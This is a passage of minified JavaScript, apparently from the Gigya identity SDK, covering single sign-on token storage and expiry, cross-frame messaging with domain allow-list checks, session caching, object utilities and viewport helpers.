            return this.getStorage().getItem(e.bootstrapIndicationCookieName(window.gigya.thisScript.APIKey));
          },
          set: function (t) {
            var i = e.bootstrapIndicationCookieName(window.gigya.thisScript.APIKey),
              n = l.GmidProvider.convertHasGmidToBootstrapIndication(window.gigya, t);
            this.getStorage().setItem(i, n), window.gigya.logger.debug("set bootstrap indication on top frame: " + n);
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.calculateGmidTicketNextRun = function (e) {
          return new Date(e).getTime() - new Date().getTime();
        }, e.prototype.syncSsoLogin = function (e) {
          var t;
          for (var i in e) void 0 === t && (t = {}), t[i] = e[i];
          d.FlagService.verifyLoginOnlyOnce && f.sessionData.isSessionVerified(o.get()) || o.dispatchLoginEvent({
            context: t
          });
        }, e.serverGltToggleName = "enableServerGLT", e.bootstrapIndicationCookieName = function (e) {
          return "gig_bootstrap_" + e;
        }, e;
      }();
      t.WebAdapter = m;
    },
    319: function (e, t, i) {
      var n = this;
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var o = i(0),
        r = i(9),
        a = i(320),
        s = i(321),
        u = i(98),
        c = i(120);
      r.createAlias("gigya.setAccountResidency", a.setAccountResidency), r.createAlias("gigya.setGroupContext", s.setGroupContext), r.createAlias("gigya.setSSOToken", s.setSSOToken), r.createAlias("gigya.syncGroupGltExp", s.syncGroupGltExp), r.createAlias("gigya.hasSession", function () {
        return o.__awaiter(n, void 0, void 0, function () {
          return o.__generator(this, function (e) {
            return [2, new gigya.Promise(function (e) {
              window.gigya.isReady || (console.warn("**** gigya.hasSession must be called AFTER gigya service ready ****"), window.gigya.logger.report("Bad Implementation: gigya.hasSession")), window.gigya.utils.queue.queueForExecution("API", function () {
                return u.hasSession().then(e);
              });
            })];
          });
        });
      }), r.createAlias("gigya.sso.getContext", c.getSsoContext), r.createAlias("gigya.sso.login", c.ssoLogin), r.createAlias("gigya.sso.continue", function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
        window.gigya.utils.queue.queueForExecution("API", c.continueSso, e);
      });
    },
    320: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = ["us1", "eu1", "au1", "ru1", "cn1", "il1"];
      t.setAccountResidency = function (e) {
        if (e && -1 == i.indexOf(e.toLowerCase())) return window.gigya.logger.warn("invalid residency", {
          dataCenter: e
        });
        window.gigya.globalAccount.dataCenter = e;
      };
    },
    321: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(31),
        r = i(24);
      t.setGroupContext = function (e) {
        return n.__awaiter(this, void 0, void 0, function () {
          var t;
          return n.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return [4, o.SsoService.getInstance()];
              case 1:
                return [4, null == (t = i.sent()) ? void 0 : t.setGroupContext(e)];
              case 2:
                return i.sent(), [2];
            }
          });
        });
      }, t.setSSOToken = function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
        return n.__awaiter(this, void 0, void 0, function () {
          var t, i;
          return n.__generator(this, function (n) {
            return t = window.gigya.utils.object.merge([window.gigya.thisScript.globalConf, e]), i = t.redirectURL || document.location.href, window.gigya.utils.HTTP.redirect(i, [{}], "GET", "_top"), [2];
          });
        });
      }, t.syncGroupGltExp = function (e) {
        return void 0 === e && (e = r.getGltexpCookie()), n.__awaiter(this, void 0, void 0, function () {
          var t, i, a;
          return n.__generator(this, function (n) {
            switch (n.label) {
              case 0:
                return window.gigya.partnerSettings.ssoKey ? [4, o.SsoService.getInstance()] : [2, gigya.Promise.resolve()];
              case 1:
                return [4, null == (t = n.sent()) ? void 0 : t.setTokenExpiration(e, !1)];
              case 2:
                return i = n.sent(), (a = (null == i ? void 0 : i.gltexp) !== e) && r.setGltexp(i.gltexp), [2, {
                  hasChanged: a,
                  oldExpiration: window.gigya.utils.gltexp.getMillis(e),
                  newExpiration: window.gigya.utils.gltexp.getMillis(i.gltexp || e)
                }];
            }
          });
        });
      };
    },
    33: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0);
      t.promisify = function (e, t) {
        return void 0 === t && (t = {}), new gigya.Promise(function (i) {
          e(n.__assign(n.__assign({}, t), {
            callback: function (e) {
              i(e);
            }
          }));
        });
      };
    },
    39: function (e, t) {
      function i() {
        var e = 0,
          t = 0;
        return "number" == typeof window.pageYOffset ? (t = window.pageYOffset, e = window.pageXOffset) : document.body && (document.body.scrollLeft || document.body.scrollTop) ? (t = document.body.scrollTop, e = document.body.scrollLeft) : document.documentElement && (document.documentElement.scrollLeft || document.documentElement.scrollTop) && (t = document.documentElement.scrollTop, e = document.documentElement.scrollLeft), {
          left: e,
          top: t
        };
      }
      function n() {
        var e,
          t,
          i = document.documentElement,
          n = document.body;
        return window.innerHeight ? (e = window.innerHeight, t = window.innerWidth) : (0 == (e = i.clientHeight) && (e = n.clientHeight), 0 == (t = i.clientWidth) && (t = n.clientWidth)), {
          w: t,
          h: e
        };
      }
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.getScroll = i, t.getFullSize = function () {
        var e = document.documentElement,
          t = document.body,
          i = e.clientHeight;
        0 == i && (i = t.clientHeight);
        var n = e.clientWidth;
        return 0 == n && (n = t.clientWidth), {
          w: n,
          h: i
        };
      }, t.getOrientation = function () {
        var e = parseInt(window.orientation || "0");
        return e < 0 && (e += 360), e;
      }, t.getOuterSize = function () {
        var e,
          t,
          i = document.documentElement,
          n = document.body;
        return window.outerHeight ? (e = window.outerHeight, t = window.outerWidth) : (0 == (e = i.clientHeight) && (e = n.clientHeight), 0 == (t = i.clientWidth) && (t = n.clientWidth)), {
          w: t,
          h: e
        };
      }, t.getInnerSize = n, t.getMiddleCenter = function () {
        var e = i(),
          t = n();
        return {
          top: e.top + Math.floor(t.h / 2),
          left: e.left + Math.floor(t.w / 2)
        };
      }, t.isRectHorizontallyVisible = function (e) {
        var t = i(),
          o = n();
        return e.left >= t.left && e.right <= t.left + o.w;
      }, t.isRectFullyVisible = function (e) {
        var t = i(),
          o = n();
        return e.top >= t.top && e.bottom <= t.top + o.h && e.left >= t.left && e.right <= t.left + o.w;
      }, t.scrollIntoView = function (e) {
        e && e.scrollIntoView && e.scrollIntoView();
      };
    },
    4: function (e, t, i) {
      (function (e) {
        Object.defineProperty(t, "__esModule", {
          value: !0
        });
        var n = i(5),
          o = i(30);
        function r(e, t, i) {
          if (!t) return e;
          for (var n = e, o = t.split("."), r = 0; r < o.length; r++) {
            var a = o[r],
              s = null;
            a.match(/\[[0-9]+]/) && (s = Number(a.match(/\[[0-9]+]/)[0].replace(/[\[\]]/g, ""))), a = a.split(/\[[0-9]+]/).join("");
            var u = (s || 0 === s) && n[a] ? n[a][s] : n[a];
            if (i && !n[a] ? n[a] = {} : i && !u && !1 !== u && (n[a] = []), !u && !1 !== u) return null;
            n = u;
          }
          return n;
        }
        function a(e, t, i, n, r, s) {
          if (void 0 === n && (n = 20), void 0 === r && (r = 0), e === window) return window;
          if (r > n) return null;
          if (void 0 === e || null == e) return o.default.isOn("removeUndefinedProperties") ? e : null;
          if ("function" == typeof e && i) return null;
          if (e.constructor == Array) {
            for (var u = [], c = 0; c < e.length; c++) i && "function" == typeof e[c] || (u[c] = t ? a(e[c], t, i, n, r + 1, s) : e[c]);
            return u;
          }
          if ("object" == typeof e) {
            var l = {};
            for (var g in e) s && "context" == g || i && "function" == typeof e[g] || (l[g] = t ? a(e[g], t, i, n, r + 1, s) : e[g]);
            return l;
          }
          return e;
        }
        function s(e, t, i) {
          if (null != e) {
            if (null == t && (t = {}), e.constructor == Array) for (var n = 0; n < e.length; n++) s(e[n], t, i);else if (i) {
              var o = i.split("|"),
                r = {};
              for (var u in e) r[u.toLowerCase()] = 1;
              for (var c = 0; c < o.length; c++) {
                var l = o[c];
                r[l.toLowerCase()] && (t[l] = e[l]);
              }
            } else t = a(e, !1);
            return t;
          }
        }
        t.removeUndefined = function (e) {
          var t = {};
          for (var i in e) null != e[i] && null != e[i] && (t[i] = e[i]);
          return t;
        }, t.expressionHelper = function (e) {
          return e = e || {}, {
            getField: function (t) {
              if (t) {
                var i,
                  n = t.split("."),
                  o = e;
                for (i = 0; i < n.length; ++i) {
                  if (null == o[n[i]]) return;
                  o = o[n[i]];
                }
                return o;
              }
            }
          };
        }, t.getPropertyBySerializedName = r, t.setPropertyBySerializedName = function (e, t, i) {
          var n = t.split("."),
            o = n.pop();
          r(e, n.join("."), !0)[o] = i;
        }, t.add = function (e, t, i) {
          for (var n in t) i && void 0 !== e[n] || (e[n] = t[n]);
        }, t.getHash = function (e) {
          var t = [];
          for (var i in e) {
            var o;
            "object" == typeof e[i] ? o = n.serialize(e[i], !1) : e[i] && (o = e[i].toString()), t.push(i + "=" + o);
          }
          return t.sort().join("&");
        }, t.getMurmurHash = function (e, t) {
          var i, n, o, r, a, s, u, c;
          for (t || (t = 0), i = 3 & e.length, n = e.length - i, o = t, a = 3432918353, s = 461845907, c = 0; c < n;) u = 255 & e.charCodeAt(c) | (255 & e.charCodeAt(++c)) << 8 | (255 & e.charCodeAt(++c)) << 16 | (255 & e.charCodeAt(++c)) << 24, ++c, o = 27492 + (65535 & (r = 5 * (65535 & (o = (o ^= u = (65535 & (u = (u = (65535 & u) * a + (((u >>> 16) * a & 65535) << 16) & 4294967295) << 15 | u >>> 17)) * s + (((u >>> 16) * s & 65535) << 16) & 4294967295) << 13 | o >>> 19)) + ((5 * (o >>> 16) & 65535) << 16) & 4294967295)) + ((58964 + (r >>> 16) & 65535) << 16);
          switch (u = 0, i) {
            case 3:
              u ^= (255 & e.charCodeAt(c + 2)) << 16;
            case 2:
              u ^= (255 & e.charCodeAt(c + 1)) << 8;
            case 1:
              o ^= u = (65535 & (u = (u = (65535 & (u ^= 255 & e.charCodeAt(c))) * a + (((u >>> 16) * a & 65535) << 16) & 4294967295) << 15 | u >>> 17)) * s + (((u >>> 16) * s & 65535) << 16) & 4294967295;
          }
          return o ^= e.length, o = 2246822507 * (65535 & (o ^= o >>> 16)) + ((2246822507 * (o >>> 16) & 65535) << 16) & 4294967295, o = 3266489909 * (65535 & (o ^= o >>> 13)) + ((3266489909 * (o >>> 16) & 65535) << 16) & 4294967295, (o ^= o >>> 16) >>> 0;
        }, t.clone = a, t.merge = function e(t, i) {
          for (var n = {}, o = 0; o < t.length; o++) if (t[o] && t[o].length) for (var r = 0; r < t[o].length; r++) for (var a in t[o][r]) n[a] = t[o][r][a];else if (i) for (var a in t[o]) "object" != typeof n[a] || n[a] instanceof Array ? n[a] = t[o][a] : n[a] = e([n[a], t[o][a]], !0);else for (var a in t[o]) n[a] = t[o][a];
          return n;
        }, t.unflatten = function (e) {
          if (Object(e) !== e || Array.isArray(e)) return e;
          var t = {};
          for (var i in e) {
            for (var n = t, o = "", r = i.replace(/\[([0-9])]/, ".$1").split("."), a = 0; a < r.length; a++) {
              var s = !isNaN(Number(r[a]));
              n = n[o] || (n[o] = s ? [] : {}), o = r[a];
            }
            n[o] = e[i];
          }
          return t[""] || {};
        }, t.flatten = function (e, t) {
          void 0 === t && (t = !1);
          var i = {};
          return function e(n, o) {
            if (Object(n) !== n) i[o] = n;else if (Array.isArray(n)) {
              for (var r = n.length, a = 0; a < r; a++) {
                var s = t ? o + "[" + a + "]" : o + "." + a;
                e(n[a], o ? s : String(a));
              }
              0 === r && (i[o] = []);
            } else {
              var u = !0;
              for (var c in n) u = !1, e(n[c], o ? o + "." + c : c);
              u && "" !== o && (i[o] = {});
            }
          }(e, ""), i;
        }, t.extractProperties = s, t.extractProperty = function (e, t) {
          return s(e, void 0, t)[t];
        }, t.parseToObject = function (e) {
          try {
            var t = window.JSON.parse(e);
            if ("object" == typeof t) return t;
          } catch (e) {}
        }, t.removePropertiesPrefix = function (t, i) {
          return void 0 === t && (t = {}), void 0 === i && (i = ""), Object.keys(t).reduce(function (n, o) {
            var r;
            return e(n, ((r = {})[o.replace(i, "")] = t[o], r));
          }, {});
        }, t.addPrefixToProperties = function (e, t) {
          return void 0 === e && (e = {}), void 0 === t && (t = ""), Object.keys(e).reduce(function (i, n) {
            return 0 !== n.indexOf(t) ? i["" + t + n] = e[n] : i[n] = e[n], i;
          }, {});
        }, t.normalizeObjectKeysToLowerCase = function (e) {
          for (var t in e) e[t.toLowerCase()] = e[t];
          return e;
        }, t.decodeObjectKeys = function (e) {
          var t = {};
          for (var i in e) {
            for (var n = i; -1 !== n.indexOf("%");) n = decodeURIComponent(n);
            t[n] = e[i];
          }
          return t;
        };
      }).call(this, i(0).__assign);
    },
    40: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(6),
        o = i(26),
        r = i(47),
        a = i(14),
        s = i(16),
        u = i(41),
        c = i(10),
        l = ["gigya-api.com", "gigya-api.cn", "gigya.com", "my.gigya-ext.com", "localhost"],
        g = function () {
          function e(e, t) {
            void 0 === e && (e = r.default), void 0 === t && (t = l), this._global = e, this._defaultValidDomains = t;
          }
          return e.prototype.getPageUrl = function () {
            return this._global.documentLocation().toString();
          }, e.prototype.isValidDomain = function (e, t) {
            for (var i = n.Uri.parse(t).domain, o = e.concat(this._defaultValidDomains), r = 0; r < o.length; r++) {
              var a = o[r].replace("*", "").split(":")[0],
                s = i.indexOf(a);
              if (s >= 0 && s === i.length - a.length && (0 === s || "." === i.charAt(s - 1) || "/" === i.charAt(s - 1))) return !0;
            }
            return !1;
          }, e.prototype.sendMessage = function (e, t, i) {
            var n = "";
            for (var o in e) null != e[o] && (n += escape(o + "=" + encodeURIComponent(e[o]) + "&"));
            this._global.postMessageToParent(t + "=" + n, i);
          }, e.prototype.isValidGltExp = function (e) {
            return u.isValid(e);
          }, e.prototype.getMaxGltExp = function (e, t) {
            return u.getMax(e, t);
          }, e.prototype.decodeUrl = function (e) {
            return c.URLDecodeRecursive(e);
          }, e.prototype.deserialize = function (e) {
            return s.deserialize(e);
          }, e.prototype.getCookiesStorage = function () {
            return a.initializeAdapter(a.CookieStorageAdapter);
          }, e.prototype.validations = function () {
            return o;
          }, e.prototype.UriFactory = function (e, t) {
            return void 0 === t && (t = !0), new n.Uri(e, t);
          }, e.prototype.getFragment = function () {
            var e = this.getPageUrl();
            return -1 !== e.indexOf("#") ? e.split("#")[1] : null;
          }, e;
        }();
      t.SsoUtils = g;
    },
    41: function (e, t) {
      function i(e) {
        return e ? 1e3 * Number(e.substr(0, e.indexOf("_"))) : 0;
      }
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.isValid = function (e) {
        return i(e) > Date.now();
      }, t.getMax = function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
        if (e && e.length) return e.sort(function (e, t) {
          return i(t) - i(e);
        })[0];
      }, t.getMillis = i;
    },
    42: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(43),
        o = i(4),
        r = function () {
          function e() {}
          return e.prototype.isSessionVerified = function (e, t) {
            void 0 === t && (t = window.gigya.thisScript.APIKey);
            var i = this.createKey(e, t);
            return "true" === n.get(i);
          }, e.prototype.setIsSessionVerified = function (e, t, i) {
            void 0 === i && (i = window.gigya.thisScript.APIKey);
            var o = this.createKey(e, i);
            n.set(o, "" + t);
          }, e.prototype.createKey = function (e, t) {
            var i = o.getMurmurHash(e + "_" + t, 15).toString();
            return btoa(i);
          }, e;
        }();
      t.sessionData = new r();
    },
    43: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n,
        o = i(5),
        r = i(17),
        a = i(2);
      try {
        n = Boolean(window.sessionStorage);
      } catch (e) {
        n = !1;
      }
      function s(e, t) {
        if (n) {
          var i;
          try {
            if (i = o.deserialize(window.sessionStorage.getItem("gigyaCache")), null == t && i[e]) delete i[e];else {
              var s = new Date().getTime();
              i[e] = {
                response: t,
                time: s
              }, e.indexOf("gig_oidcContext_") >= 0 && window.gigya.logger.report("oidc storage logs - set", {
                key: e,
                value: i[e]
              }, !1, a.FlagService.forceErrorReport);
            }
            window.sessionStorage.setItem("gigyaCache", o.serialize(i));
          } catch (e) {}
          r.release("cache", "cache_" + e);
        }
      }
      function u(e) {
        s(e, null);
      }
      t.set = s, t.get = function e(t, i) {
        if (void 0 === i && (i = -1), !n) return null;
        try {
          if (r.isActive("cache_" + t)) return r.waitFor("cache_" + t, e, arguments), null;
          var s = window.sessionStorage.getItem("gigyaCache"),
            c = o.deserialize(s),
            l = c[t];
          if (l) {
            var g = new Date().getTime();
            return i < 0 || i + l.time > g ? l.response : (t.indexOf("gig_oidcContext_") >= 0 && window.gigya.logger.report("oidc storage logs - get", {
              key: t,
              value: c[t],
              cacheTime: l.time,
              currentTime: g
            }, !1, a.FlagService.forceErrorReport), u(t), null);
          }
          if (!l) return r.hold("cache", "cache_" + t), null;
        } catch (e) {}
        return null;
      }, t.remove = u;
    },
    46: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(40),
        r = function () {
          function e(e, t, i, n, r, a) {
            var s = this;
            void 0 === n && (n = {
              validDomains: [],
              logoutURLs: {},
              canaryCookiesNames: {
                isCanary: "gig_isCanary",
                version: "gig_canary_ver"
              }
            }), void 0 === r && (r = new o.SsoUtils()), void 0 === a && (a = r.getCookiesStorage()), this._apiKey = e, this._siteApiKey = t, this._ssoSegment = i, this._ssoConfig = n, this._utils = r, this._storage = a, this._checkFragment = function () {
              var e = s._utils.getFragment();
              e && e !== s._currentFragment && (s._currentFragment = e, s._start(s._utils.deserialize(e))), window.setTimeout(s._checkFragment, 200);
            }, this._storageKey = this._createKey("gig_loginToken");
            var u = this._ssoConfig.canaryCookiesNames;
            void 0 !== u && (this._canaryKey = this._createKey(u.isCanary), this._canaryVerKey = this._createKey(u.version));
          }
          return e.prototype.init = function () {
            this._checkFragment();
          }, e.prototype._start = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              var t;
              return n.__generator(this, function (i) {
                switch (i.label) {
                  case 0:
                    if (this._mode = e.m, this._requestDomain = e.d, this._lid = e.lid, this._callbackID = e.callbackID, this._siteApiKey = e.sAPIKey, !window.parent) return console.log("gigya sso: invalid use"), [2];
                    if (!this._utils.isValidDomain(this._ssoConfig.validDomains, this._requestDomain)) return console.log("gigya sso: " + this._requestDomain + " is not in valid domain: " + this._ssoConfig.validDomains.join(",")), [2];
                    switch (e.m) {
                      case "logout":
                        return [3, 1];
                      case "removeToken":
                        return [3, 3];
                      case "getToken":
                        return [3, 5];
                      case "setToken":
                        return [3, 7];
                      case "setGroupContext":
                        return [3, 9];
                      case "setLoginTokenExp":
                        return [3, 11];
                      case "getLoginTokenExp":
                        return [3, 13];
                      case "checkTokenRenew":
                        return [3, 15];
                      case "syncCanaryIndication":
                        return [3, 17];
                      case "setGroupApiDomain":
                        return [3, 19];
                      case "getGroupApiDomain":
                        return [3, 21];
                    }
                    return [3, 23];
                  case 1:
                    return [4, this.logout()];
                  case 2:
                    return t = i.sent(), [3, 24];
                  case 3:
                    return [4, this.removeToken()];
                  case 4:
                    return i.sent(), [3, 24];
                  case 5:
                    return [4, this.getToken()];
                  case 6:
                    return t = i.sent(), [3, 24];
                  case 7:
                    return [4, this.setToken(e.lt, String(e.expiration), e.gltexp)];
                  case 8:
                    return i.sent(), [3, 24];
                  case 9:
                    return [4, this.setGroupContext(e.groupContext)];
                  case 10:
                    return i.sent(), [3, 24];
                  case 11:
                    return [4, this.setTokenExpiration(e.loginTokenExp)];
                  case 12:
                    return t = i.sent(), [3, 24];
                  case 13:
                    return [4, this.getTokenExpiration()];
                  case 14:
                    return t = i.sent(), [3, 24];
                  case 15:
                    return [4, this.checkTokenRenew(e.loginToken)];
                  case 16:
                    return t = i.sent(), [3, 24];
                  case 17:
                    return [4, this.syncCanaryIndication(e.isCanary, e.canaryVersion)];
                  case 18:
                    return t = i.sent(), [3, 24];
                  case 19:
                    return [4, this.setGroupApiDomain(e.domain)];
                  case 20:
                    return i.sent(), [3, 24];
                  case 21:
                    return [4, this.getGroupApiDomain()];
                  case 22:
                    return t = i.sent(), [3, 24];
                  case 23:
                    t = {
                      errorCode: 405001
                    }, i.label = 24;
                  case 24:
                    return this._utils.sendMessage(t, this._callbackID, this._requestDomain), [2];
                }
              });
            });
          }, e.prototype.getGroupApiDomain = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              return n.__generator(this, function (e) {
                return [2, {
                  errorCode: 0,
                  domain: this._storage.getItem("apiDomain_" + this._apiKey)
                }];
              });
            });
          }, e.prototype.setGroupApiDomain = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              return n.__generator(this, function (t) {
                return this._storage.setItem("apiDomain_" + this._apiKey, e), [2];
              });
            });
          }, e.prototype.logout = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              var e;
              return n.__generator(this, function (t) {
                switch (t.label) {
                  case 0:
                    return e = this._getLogoutURLs(), [4, this.removeToken()];
                  case 1:
                    return t.sent(), this._storage.removeItem(this._storageKey + "_visited"), [2, {
                      logoutURLs: e
                    }];
                }
              });
            });
          }, e.prototype.removeToken = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              var e;
              return n.__generator(this, function (t) {
                return (e = this._storage.getItem(this._storageKey)) && (this._markRevokedLoginToken(e), this._storage.removeItem(this._storageKey)), this._storage.removeItem(this._storageKey + "_exp"), this._storage.removeItem(this._storageKey + "_gltexp"), this._storage.removeItem(this._storageKey + "_session"), this._storage.removeItem(this._storageKey + "_context"), [2];
              });
            });
          }, e.prototype.getToken = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              var e, t, i, o, r, a, s, u, c;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    return e = 0, t = this._storage.getItem(this._storageKey), "undefined" === (i = this._storage.getItem(this._storageKey + "_exp")) ? o = Date.now() - 1e3 : (o = Number(i), r = Date.now() + 63072e6, o > r && (o = Date.now() - 1e3)), a = this._storage.getItem(this._storageKey + "_gltexp"), s = this._storage.getItem(this._storageKey + "_context"), u = a || "1" === this._storage.getItem(this._storageKey + "_session"), isNaN(o) || !(0 === o && !u || o > 0 && new Date().getTime() > o) ? [3, 2] : [4, this.removeToken()];
                  case 1:
                    n.sent(), t = void 0, n.label = 2;
                  case 2:
                    return t ? (this._markSiteVisited(), c = {
                      errorCode: e,
                      login_token: t,
                      expires_in: 0 === o ? 0 : Math.round((o - new Date().getTime()) / 1e3)
                    }, s && (c.groupContext = s), 0 === o && a && (c.gltexp = a), [2, c]) : [2, {
                      errorCode: 403005
                    }];
                }
              });
            });
          }, e.prototype.setToken = function (e, t, i) {
            var o;
            return n.__awaiter(this, void 0, void 0, function () {
              var r, a, s;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    return e = e.split("|")[0], r = null === (o = this._storage.getItem(this._storageKey)) || void 0 === o ? void 0 : o.split("|")[0], e !== r && this._markRevokedLoginToken(r), e && this._storage.setItem(this._storageKey, e), t && (0 === (a = "string" == typeof t && t ? Number(t) : t) ? t = 0 : (s = void 0, s = a ? 1e3 * Number(a) : 31536e6, a = Date.now() + s), this._storage.setItem(this._storageKey + "_exp", "" + a), 0 === t && this._storage.setItem(this._storageKey + "_session", "1", 0)), void 0 === i ? [3, 2] : [4, this.setTokenExpiration(i)];
                  case 1:
                    n.sent(), n.label = 2;
                  case 2:
                    return e ? [4, this._markSiteVisited()] : [3, 4];
                  case 3:
                    n.sent(), n.label = 4;
                  case 4:
                    return [2];
                }
              });
            });
          }, e.prototype.setGroupContext = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              return n.__generator(this, function (t) {
                return this._storage.setItem(this._storageKey + "_context", JSON.stringify(e)), [2];
              });
            });
          }, e.prototype.setTokenExpiration = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              var t, i, o;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    return this._utils.isValidGltExp(e) ? [3, 1] : (this._storage.removeItem(this._storageKey + "_gltexp"), e = null, [3, 3]);
                  case 1:
                    return i = (t = this._utils).getMaxGltExp, o = [e], [4, this.getTokenExpiration()];
                  case 2:
                    e = i.apply(t, o.concat([n.sent().gltexp])), this._storage.setItem(this._storageKey + "_gltexp", e), this._storage.removeItem(this._storageKey + "_exp"), n.label = 3;
                  case 3:
                    return [2, {
                      errorCode: 0,
                      gltexp: e
                    }];
                }
              });
            });
          }, e.prototype.getTokenExpiration = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              return n.__generator(this, function (e) {
                return this._storage.getItem(this._storageKey) ? [2, {
                  errorCode: 0,
                  gltexp: this._storage.getItem(this._storageKey + "_gltexp")
                }] : [2, {
                  errorCode: 403005
                }];
              });
            });
          }, e.prototype.checkTokenRenew = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              var t, i;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    return [4, this.getToken()];
                  case 1:
                    return t = n.sent(), i = this._storage.getItem(this._storageKey + "_revoked_tokens") || "", i.indexOf(e) >= 0 ? [3, 3] : [4, this.setToken(e)];
                  case 2:
                    return n.sent(), [2, {
                      errorCode: 0
                    }];
                  case 3:
                    return 0 === t.errorCode && i.indexOf(t.login_token) < 0 ? (t.errorCode = 403032, [2, t]) : [2, {
                      errorCode: 403025
                    }];
                  case 4:
                    return [2];
                }
              });
            });
          }, e.prototype.syncCanaryIndication = function (e, t) {
            return n.__awaiter(this, void 0, void 0, function () {
              var i, o, r, a, s;
              return n.__generator(this, function (n) {
                return this._canaryKey && this._canaryVerKey ? (i = this._storage.getItem(this._canaryKey), o = this._storage.getItem(this._canaryVerKey), r = {
                  errorCode: 0,
                  isCanary: e,
                  canaryVersion: t
                }, this._utils.validations().allDefinedOrAllUndefined(i, o) ? this._utils.validations().allDefinedOrAllUndefined(e, t) ? (a = this._parseCanaryVersionSignature(t), s = this._parseCanaryVersionSignature(o), a.timestamp > s.timestamp ? (this._storage.setItem(this._canaryKey, e), this._storage.setItem(this._canaryVerKey, t)) : (r.isCanary = i, r.canaryVersion = o), [2, r]) : [2, {
                  errorCode: 400006,
                  isCanary: i,
                  canaryVersion: o
                }] : (r.errorCode = 400006, [2, r])) : [2, {
                  errorCode: 500033
                }];
              });
            });
          }, e.prototype._markSiteVisited = function () {
            var e = this._storageKey + "_visited",
              t = this._storage.getItem(e) || "";
            -1 === t.indexOf(this._siteApiKey) && (t += "," + this._siteApiKey), this._storage.setItem(e, t);
          }, e.prototype._markRevokedLoginToken = function (e) {
            if (e) {
              var t = this._storageKey + "_revoked_tokens",
                i = this._storage.getItem(t) || "",
                n = i.split(",");
              n.length > 3 && n.splice(1, 1), (i = n.join(",")).indexOf(e) < 0 && (i += "," + e), this._storage.setItem(t, i);
            }
          }, e.prototype._getLogoutURLs = function () {
            var e = this._storage.getItem(this._storageKey + "_visited");
            if (!e) return "";
            var t = [];
            for (var i in this._ssoConfig.logoutURLs) -1 !== e.indexOf("," + i) && t.push(this._ssoConfig.logoutURLs[i]);
            return t.join(",");
          }, e.prototype._createKey = function (e) {
            return e + "_" + this._apiKey + (this._ssoSegment ? "_" + this._ssoSegment : "");
          }, e.prototype._parseCanaryVersionSignature = function (e) {
            var t = {
              build: 0,
              probability: 0,
              timestamp: -1
            };
            if (!e) return t;
            var i = e.split("-");
            return i.length < 3 ? t : {
              build: Number(i[0]),
              probability: Number(i[1]),
              timestamp: Number(i[2])
            };
          }, e;
        }();
      t.Sso = r;
    },
    47: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = function () {
        function e() {}
        return e.prototype.documentLocation = function () {
          return document.location;
        }, e.prototype.postMessageToParent = function (e, t, i) {
          window.parent.postMessage(e, t, i);
        }, e;
      }();
      t.GlobalProvider = i, t.default = new i();
    },
    48: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(25),
        r = function () {
          function e(e, t, i, n, r, a) {
            var s = this;
            void 0 === t && (t = 6e4), void 0 === i && (i = o.generateId), void 0 === n && (n = o.createIframe), void 0 === r && (r = function () {
              return new gigya.Promise(function (e) {
                document.body ? e(document.body) : document.addEventListener("DOMContentLoaded", function () {
                  return e(document.body);
                });
              });
            }), void 0 === a && (a = window), this.url = e, this.timeout = t, this._idCreator = i, this._iframeCreator = n, this.getIframeHost = r, this._win = a, this._pendingReqs = [], this._mutationObservers = [], this.onResponse = function (e) {
              var t = window.gigya.utils.JSON.parse(e.data);
              t && s._pendingReqs[t.id] && s.validateOrigin(e.origin) && (s._pendingReqs[t.id](t), delete s._pendingReqs[t.id]);
            };
          }
          return Object.defineProperty(e.prototype, "isInit", {
            get: function () {
              return Boolean(this._iframe);
            },
            enumerable: !0,
            configurable: !0
          }), e.prototype.init = function (e) {
            var t = this;
            return this.isInit ? gigya.Promise.reject("proxy already initialized") : new gigya.Promise(function (i, n) {
              t._iframe = t._iframeCreator(e), t._iframe.src = t.url, t.getIframeHost().then(function (e) {
                t._iframeHost = e, t._iframeHost.appendChild(t._iframe), window.gigya.logger.isEnabled && t.startObservingIFrameRemoval();
                var o = t._win.setTimeout(function () {
                    return n("proxy init timeout");
                  }, t.timeout),
                  r = function (e) {
                    if (t.validateOrigin(e.origin)) {
                      var a = t._tryParseResponse(e.data);
                      if (null == a ? void 0 : a.signal) switch (t._win.clearTimeout(o), t._win.removeEventListener("message", r, !0), a.signal) {
                        case "listening":
                          t._win.addEventListener("message", t.onResponse, !0), i(a.res);
                          break;
                        case "error":
                        case "stop":
                          n(a.res);
                          break;
                        default:
                          n("unsupported response");
                      }
                    }
                  };
                t._win.addEventListener("message", r, !0);
              });
            });
          }, e.prototype.validateOrigin = function (e) {
            return o.validateOrigin(this._iframe.src, e);
